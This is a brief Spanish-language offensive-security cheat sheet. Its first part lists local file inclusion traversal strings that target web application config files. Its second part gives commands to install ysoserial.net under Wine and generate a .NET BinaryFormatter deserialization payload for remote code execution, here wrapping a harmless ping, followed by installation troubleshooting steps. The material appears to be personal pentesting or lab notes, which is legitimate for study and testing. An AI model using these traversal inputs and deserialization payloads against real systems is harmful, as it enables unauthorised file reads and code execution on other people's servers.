

# LFI
### ARCHIVOS COMUNES DE CONFIGURACIÓN
```txt
../web.config
....//web.config
./php.config
./config.php
./database.php
./database.conf
```



# DESERIALIZACIÓN -> RCE
### PASOS PARA HACER EL ATAQUE
```shell
#INSTALL
sudo apt install mono-complete wine winetricks -y
❯ wget https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip
❯ unzip ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip
❯ winetricks dotnet48
❯ sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32:i386

#RUN
❯ cd Release
❯ winetricks dotnet48
❯ wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
```

*ERRORES EN LA INSTALACIÓN*
```shell
❯ sudo rm /etc/apt/sources.list.d/google.list
❯ sudo apt update
❯ sudo dpkg --add-architecture i386
❯ sudo apt update
❯ sudo apt install wine
```
